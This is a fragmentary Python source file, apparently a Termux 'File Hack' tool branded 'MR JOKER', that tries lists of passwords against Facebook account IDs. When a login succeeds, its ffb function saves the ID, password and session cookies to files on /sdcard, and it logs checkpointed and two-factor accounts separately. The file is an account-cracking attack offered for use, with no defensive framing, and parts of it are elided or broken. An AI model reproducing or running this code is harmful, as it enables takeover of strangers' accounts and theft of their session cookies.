...
try:
    ...
    os.system('python mr.joker420.py')
...
\033[1;33m          V:  M:. M. :M .V
\033[1;33m           V.:M.. M. :M.V  
\033[1;33m 𝐅𝐈𝐋𝐄 𝐇𝐀𝐂𝐊\033[1;95m𝐌𝐑 𝐉𝐎𝐊𝐄𝐑

{WHITE}[•] AUTHOR       : 𝐌𝐑 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
[•] GitHub       : 𝐌𝐃 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎
[•] FaceBook     : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
[•] Version      :   {GREEN}1.0

{WHITE}================================================
        \033[1;35m Welcome To 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 Tool \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.mr.joker420.etc..')
                                linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [mr.joker420] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [mr.joker420-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/mr.joker420-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/mr.joker420-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[mr.joker420-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [mr.joker420-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/mr.joker420-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/mr.joker420-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [mr.joker420-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/mr.joker420.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/mr.joker420-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/mr.joker420-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
